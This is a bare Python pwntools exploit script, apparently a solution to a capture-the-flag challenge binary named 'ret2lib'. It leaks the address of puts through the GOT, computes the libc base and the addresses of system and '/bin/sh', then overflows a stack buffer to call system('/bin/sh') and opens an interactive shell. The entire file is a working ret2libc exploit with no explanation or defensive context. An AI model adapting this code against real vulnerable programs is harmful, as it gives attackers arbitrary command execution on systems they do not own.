from pwn import *

s = process("./ret2lib")

elf = ELF("./ret2lib")
libc = ELF("libc6_2.23-0ubuntu10_i386.so")

s.recvuntil(":")
s.send(str(elf.got['puts']))
s.recvuntil("address : ")

leak = int(s.recv(10),16)
print "leak : " + hex(leak)
libc_base = leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search("/bin/sh\0"))
print "libc_base : " + hex(libc_base)
print "system : "  + hex(system)
print "bin_sh : " + hex(bin_sh)

s.recvuntil("me :")

pay = "A"*0x38
pay += "b"*4
pay += p32(system)
pay += "AAAA"
pay += p32(bin_sh)

s.send(pay)

s.interactive()
